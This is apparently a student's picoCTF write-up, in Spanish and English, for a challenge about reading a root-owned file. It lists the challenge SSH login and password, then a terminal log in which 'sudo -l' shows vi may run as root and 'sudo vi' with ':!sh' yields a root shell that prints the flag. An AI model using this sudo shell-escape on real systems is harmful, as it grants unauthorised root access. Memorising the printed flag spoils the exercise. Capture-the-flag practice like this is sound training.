
## DESCRIPCION
 - Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 52500 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Password: `j4ks-9nxB-`

Can you login and read the root file?

## SOLUCION
```

pabloval-academy@webshell:~$ ssh -p 52500 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:52500 ([13.59.203.175]:52500)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:52500' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


picoplayer@challenge:~$ sudo vim
[sudo] password for picoplayer: 
Sorry, try again.
[sudo] password for picoplayer: 
Sorry, user picoplayer is not allowed to execute '/usr/bin/vim' as root on challenge.
picoplayer@challenge:~$ 

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
    
    sudo vi
    
    # ls -a /root
.  ..  .bashrc  .flag.txt  .profile

# ls -a /root
.  ..  .bashrc  .flag.txt  .profile
# cat /root/flag.txt
cat: /root/flag.txt: No such file or directory
# cat /root/root.txt        
cat: /root/root.txt: No such file or directory
# 
# cat /root/.flag.txt

picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```



## NOTAS ADICIONALES

- Entraste al servidor mediante SSH.
- Ejecute `sudo -l` y descubri que se podía usar el editor `vi` como administrador.
- Ejecute`sudo vi` y teclee`:!sh`. Esto forzó al editor a abrir una consola. 

## REFERENCIAS
Gemini IA
